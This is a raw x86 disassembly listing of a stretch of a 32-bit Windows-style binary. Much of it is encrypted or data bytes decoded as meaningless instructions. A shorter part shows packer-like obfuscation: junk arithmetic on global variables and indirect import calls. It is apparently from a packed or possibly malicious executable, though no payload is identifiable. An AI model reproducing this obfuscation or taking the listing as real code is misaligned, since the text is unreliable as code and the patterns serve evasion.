  4174ae:	mov    ds:0x1fe500d1,eax
  4174b3:	xchg   BYTE PTR [edx-0x64],ah
  4174b6:	dec    esp
  4174b7:	cwde   
  4174b8:	loope  0x417528
  4174ba:	aam    0x16
  4174bc:	out    dx,al
  4174bd:	jo     0x417519
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x422404
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428ea0
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x4223f0
  417502:	call   DWORD PTR ds:0x428ec4
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428eac
  41750f:	mov    ecx,DWORD PTR ds:0x4227b8
  417515:	sub    DWORD PTR ds:0x42833f,0x4283bb
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [ebp+esi*2+0xa6a331a]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1+0x534e1818],bh
  41753e:	xchg   BYTE PTR [esi],ah
  417540:	adc    cl,dh
  417542:	outs   dx,DWORD PTR ds:[esi]
  417543:	jmp    0x4174c6
  417545:	pop    ebx
  417546:	inc    BYTE PTR [ebx+edx*4-0x73fbaf68]
  41754d:	adc    ecx,ebp
  41754f:	js     0x4174fb
  417551:	or     BYTE PTR [eax+0x5c],al
  417554:	les    ebx,FWORD PTR ds:0xec6e0aca
  41755a:	adc    eax,0x164113d6
  41755f:	test   DWORD PTR [ebx-0x4b],ebx
  417562:	(bad)  
  417563:	mov    ebp,0x56381780
  417568:	test   BYTE PTR [esi+eiz*2+0x5e],dh
  41756c:	repz jle 0x41750d
  41756f:	dec    esi
  417570:	add    DWORD PTR [ecx-0x6cab3290],esi
  417576:	hlt    
  417577:	add    eax,0x53488ee8
  41757c:	stos   DWORD PTR es:[edi],eax
  41757d:	jne    0x417523
  41757f:	mov    fs,WORD PTR [edi+0x5a621c7b]
  417585:	cmp    bl,cl
  417587:	fwait
  417588:	push   ss
  417589:	pushf  
  41758a:	out    0xfb,eax
  41758c:	pop    eax
  41758d:	dec    edx
  41758e:	inc    bx
  417590:	aaa    
  417591:	add    esi,DWORD PTR [ebx-0x7f]
  417594:	(bad)  
  417595:	shl    BYTE PTR [eax],0x8e
  417598:	cmp    dh,BYTE PTR [edx+0x5]
  41759b:	retf   
  41759c:	cld    
  41759d:	inc    edx
  41759e:	fld    TBYTE PTR [esi-0x6a]
  4175a1:	mov    DWORD PTR [edx-0x34],0x14d29a3d
  4175a8:	call   0xd31ba7de
  4175ad:	mov    dh,0xb7
  4175af:	xor    BYTE PTR [edx-0x4a07d7cd],ah
  4175b5:	sbb    esi,DWORD PTR [edx-0x64]
  4175b8:	(bad)  
  4175ba:	push   ecx
  4175bb:	sub    BYTE PTR [ebx+0x5f4ae7ea],0xd5
  4175c2:	in     eax,dx
  4175c3:	rcr    BYTE PTR [eax],0x77
  4175c6:	push   0x8886792b
  4175cb:	push   ecx
  4175cc:	xor    al,dl
  4175ce:	cmc    
  4175cf:	lods   eax,DWORD PTR ds:[esi]
  4175d0:	mov    ch,0x95
  4175d2:	xchg   BYTE PTR [ecx+0x5daf7a15],al
  4175d8:	sub    bh,BYTE PTR [esi+0x589eb3bc]
  4175de:	in     ax,0x3b
  4175e1:	and    DWORD PTR [ebx+0x645f5eeb],edx
  4175e7:	xor    DWORD PTR ds:0xaa715df8,0x6ba8ff72
  4175f1:	and    BYTE PTR [eax+edi*1],dh
  4175f4:	retf   0xfd29
  4175f7:	shl    BYTE PTR [edi-0x266ff6f8],1
  4175fd:	add    DWORD PTR [ebp-0x68],ebp
  417600:	fsub   QWORD PTR [esi-0x6a470169]
  417606:	dec    eax
  417607:	xor    BYTE PTR [esi],ah
  417609:	call   0xed4d:0xcbb07b52
  417610:	sahf   
  417611:	or     al,0x44
  417613:	or     BYTE PTR [edx-0x20],dl
  417616:	test   eax,0x8af7b880
  41761b:	pop    esp
  41761c:	and    eax,0xc5f229d8
  417621:	sub    ebp,DWORD PTR [edx+0x2d086b5b]
  417627:	or     al,0x7e
  417629:	(bad)  
  41762a:	iret   
  41762b:	test   DWORD PTR [esi+0x1b],esi
  41762e:	push   esp
  41762f:	call   0xbd69:0xbd426590
  417636:	mov    al,ds:0xfb2b160f
  41763b:	and    cl,bl
  41763d:	xor    eax,DWORD PTR [edi]
  41763f:	jae    0x41765a
  417641:	sub    ebx,DWORD PTR [edx-0x3dc646fe]
  417647:	inc    edi
  417648:	scas   al,BYTE PTR es:[edi]
  417649:	pusha  
  41764a:	ret    
  41764b:	pushf  
  41764c:	sbb    eax,0x33039f8c
  417651:	in     eax,dx
  417652:	push   ebp
  417653:	cdq    
  417654:	pop    edi
  417655:	inc    eax
  417656:	xchg   esp,eax
  417657:	les    ecx,FWORD PTR [bx+di+0x68]
  41765b:	pop    edi
  41765c:	hlt    
  41765d:	jp     0x41769a
  41765f:	std    
  417660:	std    
  417661:	mov    dl,ah
  417663:	stos   DWORD PTR es:[edi],eax
  417664:	or     DWORD PTR [ecx+0x28fd7b39],0x4f193686
  41766e:	gs das 
  417670:	mov    ebp,0xca13fa54
  417675:	stos   BYTE PTR es:[edi],al
  417676:	inc    ebx
  417677:	xchg   al,dl
  417679:	call   DWORD PTR [edx+0xe270fb5]
  41767f:	cmp    ecx,ecx
  417681:	mov    DWORD PTR ds:0xbd4b598f,ecx
  417687:	pushf  
  417688:	and    DWORD PTR [edx+0x57],0x58b730c4
  41768f:	cdq    
  417690:	aas    
  417691:	hlt    
  417692:	cdq    
  417693:	jbe    0x417680
  417695:	inc    ebp
  417696:	das    
  417697:	mov    ch,0x13
  417699:	ds jno 0x417703
  41769c:	sbb    ah,BYTE PTR [esi-0x10]
  41769f:	mov    ds:0x23b515d0,al
  4176a4:	sub    al,0x69
  4176a6:	jle    0x417681
  4176a8:	or     cl,BYTE PTR ds:0xcb2ec8e1
  4176ae:	es in  al,0x70
  4176b1:	(bad)  
  4176b2:	cmp    edi,edi
  4176b4:	push   cs
  4176b5:	(bad)  
  4176b6:	in     al,dx
  4176b7:	arpl   WORD PTR [edx+eax*4],bp
  4176ba:	mov    bl,0x1c
  4176bc:	mov    dh,0x80
  4176be:	data16 icebp 
  4176c0:	jb     0x4176a5
  4176c2:	test   dl,bl
  4176c4:	je     0x4176b2
  4176c6:	fmul   QWORD PTR [eax]
  4176c8:	xchg   esi,eax
  4176c9:	je     0x417729
  4176cb:	and    al,0x8b
  4176cd:	xchg   ebx,eax
  4176ce:	ret    0x4764
  4176d1:	pop    edi
  4176d2:	call   0x5f51a3b2
  4176d7:	push   esi
  4176d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176d9:	jns    0x41765f
  4176db:	lahf   
  4176dc:	sbb    edx,DWORD PTR [ecx-0x24cd7c13]
  4176e2:	call   DWORD PTR ds:0x1140bae3
  4176e8:	out    0x20,al
  4176ea:	mov    ds,WORD PTR [ecx+0x68]
  4176ed:	push   ss
  4176ee:	(bad)  
  4176ef:	push   esi
  4176f0:	mov    bh,0x5e
  4176f2:	sub    BYTE PTR [edi-0x4e],al
  4176f5:	push   es
  4176f6:	push   ebx
  4176f7:	jmp    0x7556f08
  4176fc:	dec    ebp
  4176fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176fe:	dec    ecx
  4176ff:	xchg   ebp,eax
  417700:	push   es
  417701:	in     al,dx
  417702:	pop    ebp
  417703:	push   0xffffffa6
  417705:	push   ecx
  417706:	jecxz  0x417730
  417708:	inc    ebx
  417709:	cli    
  41770a:	add    eax,0x1d4ec6d1
  41770f:	sub    al,0x71
  417711:	popf   
  417712:	push   ebx
  417713:	mov    ebp,DWORD PTR [ecx-0x58251c24]
  417719:	scas   eax,DWORD PTR es:[edi]
  41771a:	and    edi,DWORD PTR [ebp+0x46]
  41771d:	mov    al,gs:0xcb4bb7ea
  417723:	test   al,0x55
  417725:	pusha  
  417726:	mov    al,0xaf
  417728:	lods   eax,DWORD PTR ds:[esi]
  417729:	stc    
  41772a:	in     eax,0x93
  41772c:	or     eax,0x7d09a5e
  417731:	test   BYTE PTR [esi-0x2c],0x24
  417735:	dec    eax
  417736:	mov    cl,0x33
  417738:	scas   eax,DWORD PTR es:[edi]
  417739:	xchg   edx,eax
  41773a:	outs   dx,BYTE PTR ds:[esi]
  41773b:	push   edx
  41773c:	adc    DWORD PTR [eax],esp
  41773e:	jae    0x4177b0
  417740:	lahf   
  417741:	cmp    al,0x7
  417743:	sub    al,0x67
  417745:	add    esp,edx
  417747:	adc    DWORD PTR [ebp-0x7a],edi
  41774a:	sahf   
  41774b:	sar    dl,0xe1
  41774e:	in     al,dx
  41774f:	jcxz   0x417763
  417752:	test   al,0x86
  417754:	push   eax
  417755:	push   0x27
  417757:	cdq    
  417758:	cdq    
  417759:	(bad)  
  41775a:	sub    DWORD PTR [esi+0x36d9564a],esi
  417760:	mov    WORD PTR [ebp-0x391005a],cs
  417766:	leave  
  417767:	shr    DWORD PTR [edi],cl
  417769:	sub    BYTE PTR [ecx-0x5e2da737],dl
  41776f:	test   eax,0x900f1b71
  417774:	test   al,0x32
  417776:	dec    esi
  417777:	or     edx,esp
  417779:	mov    cl,0xb5
  41777b:	arpl   di,cx
  41777d:	cmc    
  41777e:	aam    0xf1
  417780:	in     eax,0x5e
  417782:	fwait
  417783:	(bad)  
  417784:	and    al,0x57
  417786:	out    0xf9,al
  417788:	mov    ch,0x5a
  41778a:	sub    BYTE PTR [esi-0x51],bl
  41778d:	push   es
  41778e:	sub    eax,0xf397bb28
  417793:	adc    DWORD PTR ds:0x672282de,ecx
  417799:	push   esi
  41779a:	sti    
  41779b:	jecxz  0x4177a5
  41779d:	xchg   ecx,eax
  41779e:	call   0xa8f7:0xb2f80fd0
  4177a5:	ins    DWORD PTR es:[edi],dx
  4177a6:	inc    ebx
  4177a7:	loopne 0x4177ee
  4177a9:	scas   eax,DWORD PTR es:[edi]
  4177aa:	jo     0x417753
  4177ac:	lds    ebp,FWORD PTR [edi-0x1d]
  4177af:	iret   
  4177b0:	lahf   
  4177b1:	xor    BYTE PTR [esi+esi*2-0x744a6ac4],bl
  4177b8:	ret    
  4177b9:	mov    dl,0x91
  4177bb:	test   BYTE PTR [eax],dh
  4177bd:	mov    bh,0x1a
  4177bf:	jnp    0x417840
  4177c1:	jp     0x4177a9
  4177c3:	pop    esi
  4177c4:	adc    edx,DWORD PTR [eax-0xf4bfbc6]
  4177ca:	test   DWORD PTR [ebx-0xb35912a],ecx
  4177d0:	hlt    
  4177d1:	pop    edx
  4177d2:	enter  0x1e15,0x50
  4177d6:	mov    dl,0x57
  4177d8:	mov    al,cs:0x32982ff7
  4177de:	adc    BYTE PTR [eax+0x216e6ace],bl
  4177e4:	push   ss
  4177e5:	arpl   WORD PTR ds:0x9022a934,bx
  4177eb:	fs dec eax
  4177ed:	add    bh,BYTE PTR [edi+0x5a5fb1e3]
  4177f3:	icebp  
  4177f4:	xor    BYTE PTR [ebp+0x5c],cl
  4177f7:	cmp    al,0xb4
  4177f9:	and    edx,ebp
  4177fb:	lock adc BYTE PTR ds:0x77d50ab2,bl
  417802:	mov    cl,0xd6
  417804:	mov    WORD PTR [edx],es
  417806:	cld    
  417807:	les    esp,FWORD PTR [edi-0x6164b515]
  41780d:	inc    ebp
  41780e:	pop    ebp
  41780f:	xchg   edi,eax
  417810:	inc    ebp
  417811:	and    eax,0x25c341b4
  417816:	mov    bh,BYTE PTR [edi]
  417818:	aas    
  417819:	cmp    bl,BYTE PTR [edx+0x23]
  41781c:	leave  
  41781d:	inc    edx
  41781e:	jg     0x4177a0
  417820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417821:	sbb    eax,0x8b52ca91
  417826:	jle    0x4177b5
  417828:	jae    0x4177c1
  41782a:	push   edi
  41782b:	int    0xf5
  41782d:	out    dx,al
  41782e:	cwde   
  41782f:	fmul   st(3),st
  417831:	into   
  417832:	pop    esi
  417833:	push   es
  417834:	retf   
  417835:	jg     0x4178b5
  417837:	cmp    eax,0x3bc97fa2
  41783c:	stos   DWORD PTR es:[edi],eax
  41783d:	test   DWORD PTR [ecx+0x2afcb527],eax
  417843:	add    al,0x33
  417845:	fld    TBYTE PTR [eax+0x4a]
  417848:	adc    DWORD PTR [ecx-0xc401f9c],edx
  41784e:	out    dx,eax
  41784f:	mov    al,0xc8
  417851:	cld    
  417852:	enter  0x72e5,0xce
  417856:	jns    0x417816
  417858:	retf   
  417859:	pop    ebp
  41785a:	jns    0x4177e3
  41785c:	jmp    0xbdd8f29b
  417861:	xchg   ebp,eax
  417862:	jnp    0x4177e8
  417864:	shl    BYTE PTR [ecx+edi*4+0x6ff636e],cl
  41786b:	sbb    BYTE PTR [esi+0x51],0xfe
  41786f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417870:	jp     0x4177fe
  417872:	fild   WORD PTR [esi+ecx*1-0x76]
  417876:	shl    DWORD PTR [edi+0x39],0xe1
  41787a:	mov    ds:0xfec83462,eax
  41787f:	jo     0x417839
  417881:	hlt    
  417882:	inc    BYTE PTR [ecx-0x2931eb58]
  417888:	pop    ebp
  417889:	fbstp  TBYTE PTR [ecx-0x4]
  41788c:	rcl    ebx,cl
  41788e:	pop    ebp
  41788f:	push   edi
  417890:	mov    al,0x4d
  417892:	sub    eax,0xf6677b39
  417897:	xchg   esi,eax
  417898:	loope  0x4178ff
  41789a:	(bad)  
  41789b:	xchg   esp,eax
  41789c:	xchg   edi,eax
  41789d:	and    eax,DWORD PTR [edx]
  41789f:	xchg   esi,eax
  4178a0:	ss out dx,al
  4178a2:	jp     0x4178b7
  4178a4:	inc    ebx
  4178a5:	inc    edx
  4178a6:	or     bh,ah
  4178a8:	jg     0x4178a0
  4178aa:	mov    dl,dh
  4178ac:	lahf   
  4178ad:	jmp    0x4178cf
  4178af:	imul   edi,DWORD PTR [ecx-0x1394d215],0xffffffc8
  4178b6:	or     esp,DWORD PTR [edx+0x2c]
  4178b9:	lds    edi,FWORD PTR [ecx]
  4178bb:	adc    ch,dl
  4178bd:	add    BYTE PTR [edi],0xed
  4178c0:	xchg   DWORD PTR [edx-0x8],ebx
  4178c3:	repnz imul eax,DWORD PTR [esi-0x707e117d],0x7f
  4178cb:	test   BYTE PTR [edi-0x318d1277],0x9a
  4178d2:	push   ds
  4178d3:	(bad)  
  4178d4:	lock out dx,al
  4178d6:	neg    esi
  4178d8:	mov    edi,0x552b477f
  4178dd:	sti    
  4178de:	jge    0x4178fb
  4178e0:	mov    bl,0xf8
  4178e2:	adc    al,BYTE PTR [eax+0x785a0a0f]
  4178e8:	pop    es
  4178e9:	repnz xor al,0xea
  4178ec:	test   eax,0x81006af6
  4178f1:	and    eax,0x4282d7
  4178f6:	mov    dh,0x6f
  4178f8:	add    BYTE PTR [eax],al
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x428277,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42828f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428277,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x428317
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x4282df,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42828f,0x428297
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x428353,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x4282af,0x4281db
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42819b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42829f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x4282db,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x4283e7
  4179bb:	add    DWORD PTR ds:0x4281ab,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x4282d3,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428193,0x4283af
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x4281ab,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428297
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x428337,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x4282b3,0x0
  417a53:	mov    DWORD PTR ds:0x42832f,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x4282a7,0x44f5
  417a72:	cmp    DWORD PTR ds:0x4282b3,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428e24
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428287,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x428313
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x4281cb,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x4281db,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42819f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [esp+ebp*2-0x518f9eb4],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1+0xe2e1818],bh
  417b02:	das    
  417b03:	cs leave 
  417b05:	dec    esi
  417b06:	dec    eax
  417b07:	and    eax,0xfa2ec2a0
  417b0c:	cmc    
  417b0d:	out    0x10,eax
  417b0f:	and    edi,ecx
  417b11:	inc    ecx
  417b12:	es push ds
  417b14:	inc    esi
  417b15:	pop    ebx
  417b16:	repz push ds
  417b18:	fwait
  417b19:	xor    ebp,ebx
  417b1b:	adc    BYTE PTR [ecx],dh
  417b1d:	push   0xec888e5f
  417b22:	pop    eax
  417b23:	mov    edi,0xda1f1cfe
  417b28:	loopne 0x417ac3
  417b2a:	add    esp,ebx
  417b2c:	and    DWORD PTR [eax],edi
  417b2e:	add    eax,0x35c53b9
  417b33:	leave  
  417b34:	jp     0x417ba5
  417b36:	rol    BYTE PTR [edx],1
  417b38:	shr    BYTE PTR [ebx-0x80],cl
  417b3b:	xor    edx,DWORD PTR [eax+edx*1+0x2f]
  417b3f:	dec    ecx
  417b40:	mov    dl,0x29
  417b42:	shl    DWORD PTR [esi],1
  417b44:	inc    ecx
  417b45:	and    DWORD PTR [eax+esi*2+0x57],esi
  417b49:	xor    BYTE PTR [ecx],ch
  417b4b:	mov    BYTE PTR [eax],al
  417b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b4e:	jmp    0xd5a3d18c
  417b53:	sub    edx,DWORD PTR [eax]
  417b55:	out    0x56,eax
  417b57:	jge    0x417bc5
  417b59:	fadd   DWORD PTR [edx+0x5e]
  417b5c:	xor    cl,ah
  417b5e:	pop    DWORD PTR [esi+ebx*4+0x296ac5e0]
  417b65:	jo     0x417b61
  417b67:	sub    BYTE PTR [esp+edx*8-0x34dcced9],0xa5
  417b6f:	sbb    DWORD PTR [edx],edx
  417b71:	ja     0x417b47
  417b73:	mov    WORD PTR [bx+si],ss
  417b76:	bound  edx,QWORD PTR [ebx+0x6c]
  417b79:	xor    edi,eax
  417b7b:	inc    eax
  417b7c:	aam    0xd4
  417b7e:	mov    eax,0x7bca4329
  417b83:	mov    bl,0xed
  417b85:	push   0xf0a11ca5
  417b8a:	add    ebx,DWORD PTR [edx-0x421e4217]
  417b90:	inc    ecx
  417b92:	(bad)  
  417b93:	imul   DWORD PTR [esi+0x5bfa4deb]
  417b99:	inc    eax
  417b9a:	or     al,0xf8
  417b9c:	aam    0xfc
  417b9e:	xchg   esi,eax
  417b9f:	push   0xf176d961
  417ba4:	call   0xa7ae527e
  417ba9:	ds popf 
  417bab:	mov    ds:0x56d0a089,eax
  417bb0:	fs and eax,0x6386469e
  417bb6:	cld    
  417bb7:	xchg   edi,eax
  417bb8:	in     al,0xb2
  417bba:	push   edx
  417bbb:	push   ebx
  417bbc:	fistp  WORD PTR ds:0xc94b880a
  417bc2:	or     edi,esi
  417bc4:	cmp    edi,DWORD PTR ds:0x881d2487
  417bca:	lahf   
  417bcb:	and    al,0xcb
  417bcd:	adc    DWORD PTR [esi],0xffffffa0
  417bd0:	push   edx
  417bd1:	int3   
  417bd2:	lds    ebp,FWORD PTR [edx-0x13]
  417bd5:	ror    DWORD PTR [ebx+0x2f],1
  417bd8:	or     al,0xca
  417bda:	ins    DWORD PTR es:[edi],dx
  417bdb:	jmp    0xe1e476a9
  417be0:	mov    dh,0x1
  417be2:	sub    dh,ah
  417be4:	out    dx,al
  417be5:	push   ds
  417be6:	push   ecx
  417be7:	jne    0x417c2c
  417be9:	into   
  417bea:	inc    edi
  417beb:	xlat   BYTE PTR ds:[ebx]
  417bec:	call   0xc178:0xd82d5740
  417bf3:	out    dx,al
  417bf4:	sti    
  417bf5:	retf   
  417bf6:	dec    esp
  417bf7:	(bad)  
  417bf8:	jge    0x417b94
  417bfa:	add    al,0x2f
  417bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bfd:	adc    eax,0x9d18974a
  417c02:	pushf  
  417c03:	int    0xa2
  417c05:	repnz mov bh,0x88
  417c08:	stos   BYTE PTR es:[edi],al
  417c09:	shr    DWORD PTR [ecx-0x33],1
  417c0c:	pop    esp
  417c0d:	mov    ch,0x82
  417c0f:	mov    fs,WORD PTR [eax-0x7f]
  417c12:	(bad)  [edx-0x40]
  417c15:	ficom  WORD PTR [esi-0x22]
  417c18:	push   ebx
  417c19:	add    al,0x18
  417c1b:	out    0xd5,eax
  417c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c1e:	mov    ah,0x60
  417c20:	adc    BYTE PTR [ecx-0x4a],bh
  417c23:	add    edi,DWORD PTR [ecx]
  417c25:	test   esp,eax
  417c27:	pop    esp
  417c28:	mov    al,0xa9
  417c2a:	push   ebp
  417c2b:	test   edi,0x447f723a
  417c31:	es mov edx,0x50180eca
  417c37:	pop    eax
  417c38:	add    eax,0x2abdeeee
  417c3d:	pop    esi
  417c3e:	int    0xc6
  417c40:	jns    0x417cbc
  417c42:	imul   ebx,DWORD PTR ds:0xa44dea90,0x6937c35b
  417c4c:	bound  esp,QWORD PTR [edi-0x1c]
  417c4f:	or     DWORD PTR [esi],esp
  417c51:	pop    ebp
  417c52:	mov    bl,0xb8
  417c54:	stos   DWORD PTR es:[edi],eax
  417c55:	outs   dx,BYTE PTR ds:[esi]
  417c56:	es (bad) 
  417c58:	mov    ch,0xdb
  417c5a:	cmp    BYTE PTR [ebx+0x59d4765a],ch
  417c60:	xchg   BYTE PTR [ebx-0x58131343],ah
  417c66:	add    eax,0xac035ff7
  417c6b:	lds    ebp,FWORD PTR [ecx]
  417c6d:	arpl   WORD PTR [esi],cx
  417c6f:	mov    ebp,ss
  417c71:	ja     0x417cb4
  417c73:	xchg   ecx,eax
  417c74:	cwde   
  417c75:	xor    esi,ecx
  417c77:	xlat   BYTE PTR ds:[ebx]
  417c78:	fimul  WORD PTR [eax+0x77]
  417c7b:	inc    esi
  417c7c:	sbb    ah,BYTE PTR [ebx-0x29918e70]
  417c82:	daa    
  417c83:	sar    ah,1
  417c85:	or     edx,DWORD PTR [esi+0x2af28165]
  417c8b:	mov    ds:0x275126c7,al
  417c90:	fadd   st(1),st
  417c92:	inc    ebx
  417c93:	cmp    ebx,DWORD PTR [edi+0x5c86dd72]
  417c99:	push   esi
  417c9a:	into   
  417c9b:	inc    esi
  417c9c:	pushf  
  417c9d:	stc    
  417c9e:	in     al,0xdd
  417ca0:	push   edx
  417ca1:	cli    
  417ca2:	sbb    DWORD PTR ss:[ebx+0x39498a09],edi
  417ca9:	loopne 0x417ca4
  417cab:	cmp    BYTE PTR [edi+eiz*1-0x5a130e1c],0x54
  417cb3:	jmp    0x417c66
  417cb5:	jp     0x417d0c
  417cb7:	call   0xa096:0xb0a84ddc
  417cbe:	fsub   st(6),st
  417cc0:	retf   
  417cc1:	push   edx
  417cc2:	iret   
  417cc3:	(bad)  
  417cc4:	ins    DWORD PTR es:[edi],dx
  417cc5:	mov    ebp,DWORD PTR [esi+esi*1+0x40]
  417cc9:	lock pushf 
  417ccb:	fbstp  TBYTE PTR [esi]
  417ccd:	or     cl,dl
  417ccf:	adc    dl,bh
  417cd1:	inc    eax
  417cd2:	shl    DWORD PTR [edx-0x1f60b40e],1
  417cd8:	mov    esp,0xa63dd2dd
  417cdd:	aad    0xc5
  417cdf:	pushf  
  417ce0:	push   ss
  417ce1:	mov    bh,0x25
  417ce3:	cmp    dh,BYTE PTR [ebp+esi*4+0x78ab9893]
  417cea:	and    eax,0x984d065
  417cef:	pop    edi
  417cf0:	or     edx,DWORD PTR [ebp+0x16]
  417cf3:	pop    ebp
  417cf4:	jge    0x417ccc
  417cf6:	jl     0x417d3e
  417cf8:	std    
  417cf9:	stc    
  417cfa:	(bad)  
  417cfb:	jl     0x417d76
  417cfd:	fcom   DWORD PTR [ecx-0x31]
  417d00:	dec    ebp
  417d01:	das    
  417d02:	mov    esp,0x2a7c8a7a
  417d07:	cs pop eax
  417d09:	iret   
  417d0a:	push   ss
  417d0b:	fadd   QWORD PTR [edx]
  417d0d:	ret    
  417d0e:	nop
  417d0f:	xchg   ecx,eax
  417d10:	mov    esp,0xfdf31b8
  417d15:	inc    ebp
  417d16:	fcomp  DWORD PTR [ebp+eiz*2+0x6c]
  417d1a:	pusha  
  417d1b:	push   ecx
  417d1c:	or     eax,DWORD PTR [ecx-0x6938d7a0]
  417d22:	xchg   DWORD PTR [edx],eax
  417d24:	je     0x417cfd
  417d26:	and    eax,0x70c33e48
  417d2b:	jne    0x417ce0
  417d2d:	and    ebx,DWORD PTR [edx+0x16f31d7f]
  417d33:	lods   eax,DWORD PTR ds:[esi]
  417d34:	test   al,0x5e
  417d36:	(bad)  
  417d37:	dec    esp
  417d38:	add    al,BYTE PTR [esi]
  417d3a:	shr    DWORD PTR [edi],cl
  417d3c:	stos   BYTE PTR es:[edi],al
  417d3d:	jp     0x417ce9
  417d3f:	xchg   ebx,eax
  417d40:	dec    ecx
  417d41:	add    bh,ch
  417d43:	pop    ds
  417d44:	retf   
  417d45:	popa   
  417d46:	imul   eax,DWORD PTR [ecx+0x27],0x3034e3d5
  417d4d:	push   eax
  417d4e:	sti    
  417d4f:	inc    edx
  417d50:	inc    esp
  417d51:	test   al,0x9b
  417d53:	(bad)
  417d57:	ss (bad) 
  417d59:	inc    DWORD PTR [ebp+0x6611ed79]
  417d5f:	mov    al,ds:0x463a788c
  417d64:	inc    eax
  417d65:	in     eax,0x88
  417d67:	fcmovb st,st(1)
  417d69:	int3   
  417d6a:	xchg   ebx,eax
  417d6b:	push   esp
  417d6c:	lock jo 0x417d9b
  417d6f:	pop    ebx
  417d70:	std    
  417d71:	stos   DWORD PTR es:[edi],eax
  417d72:	sub    dl,BYTE PTR [ecx+0x52]
  417d75:	cmp    DWORD PTR [edi],0xccfc2030
  417d7b:	add    BYTE PTR [edi],bl
